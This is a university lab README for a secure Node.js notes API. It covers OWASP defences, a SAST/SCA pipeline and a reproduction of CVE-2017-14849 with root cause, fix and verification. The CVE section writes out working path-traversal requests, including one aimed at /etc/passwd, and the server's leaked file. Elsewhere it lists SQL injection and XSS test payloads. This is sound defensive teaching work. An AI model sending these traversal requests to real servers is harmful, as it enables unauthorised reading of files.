# Secure Notes API — Information Security Lab, Work 1

A small REST API built to demonstrate the OWASP Top 10 defences required by
Work 1, together with a CI/CD pipeline that runs static analysis (SAST) and
dependency analysis (SCA) on every push, and a reproduction of a real CVE
(**CVE-2017-14849**) with root-cause analysis, fix and verification.

* Work: **1 — Secure REST API Development with CI/CD and Real CVE Vulnerability Analysis**
* Variant: **0**
* Author: Wang Ruilin, 22320110, HDU-ITMO Joint Institute

---

## Contents

1. [Stack](#1-stack)
2. [Quick start](#2-quick-start)
3. [API reference](#3-api-reference)
4. [Security measures](#4-security-measures)
5. [CI/CD pipeline and scan results](#5-cicd-pipeline-and-scan-results)
6. [CVE analysis](#6-cve-analysis-cve-2017-14849)
7. [Repository layout](#7-repository-layout)

---

## 1. Stack

| | |
|---|---|
| Language | JavaScript (Node.js) |
| Framework | Express 4.21 |
| Database | SQLite through the **built-in** `node:sqlite` module |
| Auth | JWT (HS256) + bcrypt password hashes |
| Runtime requirement | **Node.js >= 22.5** (for `node:sqlite`) |

`node:sqlite` is part of the runtime, so the project has **no native build
step** — `npm ci` works on any machine without a C++ toolchain. Every SQL
statement in the project is a prepared statement.

Express 4 was chosen over 5 for ecosystem maturity; `helmet`, `express.json`
with a body size limit, and an explicit error handler are all wired in.

## 2. Quick start

```bash
npm ci                # install dependencies
npm run seed          # create demo users (alice, bob, admin) and one note
npm start             # http://127.0.0.1:3000

npm test              # 14 automated checks, in-memory database
npm run audit         # SCA
npx eslint src scripts  # SAST
```

Environment variables:

| Variable | Default | Notes |
|---|---|---|
| `PORT` | `3000` | |
| `JWT_SECRET` | dev fallback | **required** when `NODE_ENV=production`, the process refuses to start otherwise |
| `DB_PATH` | `data/app.db` | use `:memory:` in tests |
| `NODE_ENV` | unset | `production` tightens the JWT secret requirement |

Demo accounts created by `npm run seed`:

```
alice / Alice#2026pass     (role: user)
bob   / Bob#2026password   (role: user)
admin / Admin#2026pass     (role: admin)
```

## 3. API reference

| # | Method | Path | Auth | Purpose |
|---|---|---|---|---|
| 1 | POST | `/auth/login` | — | authenticate, returns a JWT |
| 2 | GET | `/api/data` | Bearer | returns the caller's notes |
| 3 | POST | `/api/notes` | Bearer | creates a note (own-choice endpoint) |
| — | GET | `/api/notes/:id` | Bearer | reads one note, scoped to its owner |
| — | GET | `/health` | — | liveness probe |

### Login

```bash
curl -s -X POST http://127.0.0.1:3000/auth/login \
     -H 'Content-Type: application/json' \
     -d '{"username":"alice","password":"Alice#2026pass"}'
```

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "user": { "id": 1, "username": "alice", "role": "user" }
}
```

### Protected data

```bash
TOKEN=$(curl -s -X POST http://127.0.0.1:3000/auth/login \
        -H 'Content-Type: application/json' \
        -d '{"username":"alice","password":"Alice#2026pass"}' | node -pe 'JSON.parse(require("fs").readFileSync(0)).token')

curl -s http://127.0.0.1:3000/api/data -H "Authorization: Bearer $TOKEN"
```

Without a token:

```bash
curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:3000/api/data
# 401
```

### Create a note

```bash
curl -s -X POST http://127.0.0.1:3000/api/notes \
     -H 'Content-Type: application/json' \
     -H "Authorization: Bearer $TOKEN" \
     -d '{"title":"Meeting notes","body":"Rotate the lab passwords."}'
```

## 4. Security measures

### 4.1 SQL injection (OWASP A03)

**Every** query is a prepared statement whose SQL text is a constant defined in
`src/db.js`; only bound parameters vary with the request.

```js
findUserByUsername(db, username) {
  return db.prepare('SELECT id, username, password_hash, role FROM users WHERE username = ?')
           .get(username);
}
```

There is no string concatenation and no template literal anywhere in the data
access layer, so a payload such as `admin' OR '1'='1` is compared as a literal
string and simply fails to match a row.

The test suite asserts that four different injection payloads all return **401**.

### 4.2 Cross-site scripting (OWASP A03)

Two layers:

1. **Input validation** (`src/security.js`) — usernames must match
   `^[A-Za-z0-9_.-]{3,32}$`; note title/body are length-limited and type-checked
   before they reach the database.
2. **Output encoding** — every user-controlled string passes through
   `encodeForOutput()`, which applies HTML entity encoding to all strings in
   the response object:

```js
note.body = '<script>alert("xss")</script>'   // stored as-is
// returned as:
note.body = '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
```

Escaping on output (rather than mangling data on input) keeps the stored data
faithful and stops a payload from executing if a client later injects the value
into the DOM. The test suite posts a `<script>` payload and asserts the raw tag
never appears in any response.

### 4.3 Broken authentication (OWASP A07)

**Password storage.** Passwords are hashed with **bcrypt**, cost factor 10, and
never stored or returned in plaintext:

```js
const hash = bcrypt.hashSync(password, 10);
const ok   = bcrypt.compareSync(password, hash);
```

bcrypt is used instead of a plain SHA-256 because it is deliberately slow and
salted per user, which makes offline guessing and rainbow tables impractical.

**Token issuing.** On success the server signs a JWT with HS256:

```js
jwt.sign({ sub: String(user.id), username: user.username, role: user.role },
         secret, { algorithm: 'HS256', expiresIn: '1h', issuer: 'secure-notes-api' });
```

The token carries only the subject, username and role — no secrets — because a
JWT payload is merely base64, not encrypted.

**Middleware verification.** `requireAuth` checks the `Bearer` scheme, verifies
the signature and the registered claims (`exp`, `iss`) with an **explicit
algorithm allowlist** (this blocks the `alg: none` and algorithm-confusion
attacks), and then reloads the user from the database so that a token for a
deleted account stops working immediately.

**Timing and enumeration.** The login route always runs a bcrypt comparison,
even when the username does not exist, against a dummy hash. Without this, "no
such user" would return noticeably faster than "wrong password" and leak which
accounts exist. The error message is the same for both cases.

**Online guessing.** Five failed attempts per username inside a 15-minute
window produce `429 Too Many Requests`.

### 4.4 Other hardening

| Measure | Implementation |
|---|---|
| Security headers | `helmet()` — removes `X-Powered-By`, sets CSP, `X-Content-Type-Options`, frame options |
| Body size limit | `express.json({ limit: '10kb' })` — blocks oversized-payload DoS |
| IDOR | notes are always queried with `owner_id = ?`, so another user's note returns 404, not 403 (no existence leak) |
| Error handling | a single handler returns generic JSON; stack traces and driver messages are never sent to the client |
| Secrets | `JWT_SECRET` must come from the environment in production; the process exits if it is missing |
| SQL surface | no dynamic identifiers, no `ORDER BY` interpolation, no `eval`/`Function` |

## 5. CI/CD pipeline and scan results

`.github/workflows/security-ci.yml` runs on **every push and every pull
request**:

| Stage | Tool | Gate |
|---|---|---|
| Test | `npm test` (14 checks) | build fails on any failed check |
| **SAST** | ESLint 9 + `eslint-plugin-security` (14 rules) | build fails on any error |
| **SCA** | `npm audit` | build fails on high/critical in production dependencies |
| Reports | `reports/sast-eslint.json`, `reports/sca-npm-audit.json` | uploaded as build artifacts |

### Current results

**SAST**

```
$ npx eslint src scripts --format stylish

✖ 1 problem (0 errors, 1 warning)
```

The one remaining warning, `security/detect-object-injection`, is a false
positive: the object keys in `encodeForOutput()` come from our own column
names, not from the request. It is suppressed in place with a comment that
explains why, which is preferable to switching the rule off globally.

**SCA**

```
$ npm audit --registry=https://registry.npmjs.org
found 0 vulnerabilities
```

Raw reports are in [`evidence/`](evidence/).

> **Note on the registry.** `npm audit` needs the registry's advisory endpoint.
> It is executed against `registry.npmjs.org`; a mirror such as npmmirror does
> not implement `/-/npm/v1/security/advisories/bulk` and returns
> `[NOT_IMPLEMENTED]`.

## 6. CVE analysis: CVE-2017-14849

### 6.1 What the vulnerability is

| | |
|---|---|
| CVE | **CVE-2017-14849** |
| Affected | Node.js **8.5.0** only (8.5.0 ≤ version < 8.6.0) |
| Class | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory (path traversal) |
| Impact | Arbitrary file read outside the web root |
| Fixed in | Node.js **8.6.0**, 2017 |

Node.js 8.5.0 changed how `..` segments are handled inside `path.normalize()`.
The new implementation is wrong when a `..` appears *after* an ordinary
segment in the middle of the path: it collapses too much of the prefix. Any
framework that relies on `normalize()` to keep file access inside a directory —
`express.static` via the `send` module is the textbook case — inherits the
bug and starts serving files outside its root.

The vulnerable application in this repository is the vulhub scenario
(`node/CVE-2017-14849`): a stock Express 4.15.5 static file server.

### 6.2 Reproduction

Because Docker is not available on the machine where this work was produced,
the same application and the same runtime version were used natively instead of
in a container. The result is identical: the vulnerable Node.js version is what
matters, not the packaging.

**Official path (Vulhub, requires Docker):**

```bash
git clone https://github.com/vulhub/vulhub.git
cd vulhub/node/CVE-2017-14849
docker compose build
docker compose up -d          # http://localhost:3000
```

**Path actually executed here:**

```bash
# 1. application taken from vulhub (www/app.js, express 4.15.5)
cd cve/CVE-2017-14849
npm install                    # express 4.15.5

# 2. official Node.js 8.5.0 runtime
curl -L --ssl-no-revoke -o node8.zip \
  https://registry.npmmirror.com/-/binary/node/v8.5.0/node-v8.5.0-win-x64.zip
tar -xf node8.zip -C C:\n850

# 3. start the target
C:\n850\node-v8.5.0-win-x64\node.exe www/app.js
# Example app listening on port 3000!

# 4. baseline: the static asset is served normally
curl --path-as-is -s -o /dev/null -w '%{http_code}\n' \
  http://127.0.0.1:3000/static/main.js
# 200

# 5. the attack -- read a file that lives OUTSIDE www/static
curl --path-as-is -s -i \
  'http://127.0.0.1:3000/static/../foo/../../secret.txt'
```

**Result:**

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Accept-Ranges: bytes
Content-Type: text/plain; charset=UTF-8
Content-Length: 57

SECRET_FLAG{this-file-lives-outside-the-static-root}
```

The file `secret.txt` sits in the project root, two levels above the directory
that `express.static()` is configured to serve. The server returned it anyway.

Two details that matter when reproducing this by hand:

* `curl` normalises `..` in a URL by default. Without `--path-as-is` the
  payload never reaches the server and the attack appears not to work.
* On Windows the exact payload differs from the Linux PoC in the vulhub
  README (`/static/../../../a/../../../../etc/passwd`), because the resulting
  absolute path is built from a drive-letter root. The shape that escapes on
  Windows is `/static/../foo/../../secret.txt`.

### 6.3 Root cause

The guard inside `send@0.15.6` is:

```js
// send/index.js, line 538
if (UP_PATH_REGEXP.test(normalize('.' + sep + path))) {
  return this.error(403)          // reject anything that still contains '..'
}

// line 545
path = normalize(join(root, path))  // then build the real path
```

The check only works if `normalize()` is correct. Under Node 8.5.0 it is not:

```text
$ node-v8.5.0 -e "console.log(require('path').normalize('../foo/../../secret.txt'))"
secret.txt

$ node   v24 -e "console.log(require('path').normalize('../foo/../../secret.txt'))"
..\..\secret.txt
```

Two leading `..` segments disappear in 8.5.0, so after normalisation there is
nothing left for `UP_PATH_REGEXP` to match, the request is treated as a
*clean* relative path, and `join(root, 'secret.txt')` is resolved — one level
above `root`.

So the answer to "what kind of error is this" is: **a logic error in a language
runtime library**, not a missing input filter and not a configuration mistake.
The application did exactly what the documentation told it to do; the standard
library lied about the meaning of `..`.

### 6.4 Fix

The fix is a runtime upgrade — `fixes/` contains the changed files.

```dockerfile
# before
FROM vulhub/node:8.5.0

# minimal fix
FROM node:8.6.0

# recommended
FROM node:20-alpine
```

No application source changes are needed; `www/app.js` is byte-for-byte
identical before and after.

Why this is effective rather than a workaround: the `send` guard is built on
the invariant "after `normalize()`, any remaining `..` means an escape
attempt". Node 8.6.0 restores that invariant, so every library that depends on
it — not just this one application — is corrected at once. Filtering the
request upstream would have to re-implement path semantics, which is precisely
the kind of code that produces the next traversal bug.

### 6.5 Proof of elimination

Same application, same request, fixed runtime:

```bash
# after about 3 s of downtime to swap the interpreter
node www/app.js          # Node 24

curl --path-as-is -s -i 'http://127.0.0.1:3000/static/../foo/../../secret.txt'
```

```http
HTTP/1.1 404 Not Found
```

**Regression test** — the legitimate functionality still works:

```bash
curl --path-as-is -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:3000/static/main.js
# 200
curl --path-as-is -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:3000/
# 200
```

Raw transcripts: [`evidence/01-vulnerable-response.txt`](evidence/01-vulnerable-response.txt)
and [`evidence/02-fixed-response.txt`](evidence/02-fixed-response.txt).

As a cross-check, SCA on the pinned vulnerable tree reports what one would
expect from an end-of-life runtime:

```
$ cd cve/CVE-2017-14849 && npm audit --registry=https://registry.npmjs.org
8 vulnerabilities (2 low, 4 high, 2 critical)
```

versus `0 vulnerabilities` in the API project itself.

## 7. Repository layout

```
.
├── src/                      API source
│   ├── app.js                routes, JWT middleware, error handling
│   ├── db.js                 schema and all prepared statements
│   └── security.js           validation and output encoding
├── scripts/
│   ├── seed.js               demo users
│   └── test.js               14 automated checks
├── cve/CVE-2017-14849/       vulhub scenario, reproduced natively
│   ├── www/app.js            the vulnerable application (unmodified)
│   └── probe.js              path-handling probe used for the root-cause analysis
├── fixes/                    CVE fix: Dockerfiles, compose file, notes
├── evidence/                 raw scan and exploit transcripts
├── .github/workflows/security-ci.yml
└── README.md
```

## Limitations of this run

* **Two reproduction paths are provided**, and both give the same result.
  The Docker path is the canonical one and matches the manual:

  ```bash
  cd cve/CVE-2017-14849
  docker compose up -d --build                       # node:8.5.0, vulnerable
  docker compose -f docker-compose.fixed.yml up -d --build   # node:8.6.0, fixed
  ```

  `verify-docker.ps1` runs both in sequence and writes `docker-evidence.txt`.
  The native path (official Node.js 8.5.0 binary, no container runtime) is kept
  because it needs nothing installed and was the first method used here.

* **The attack target is mounted, not baked into the image.** `secret.txt` is
  bind-mounted at `/usr/src/secret.txt` in *both* compose files. If only the
  vulnerable image contained it, a 404 on the fixed image would prove nothing —
  the file might simply be missing. Mounting it in both leaves the runtime
  version as the only variable.

* **The repository history was created after the working tree was complete**,
  so the commits show the finished state rather than the development process.
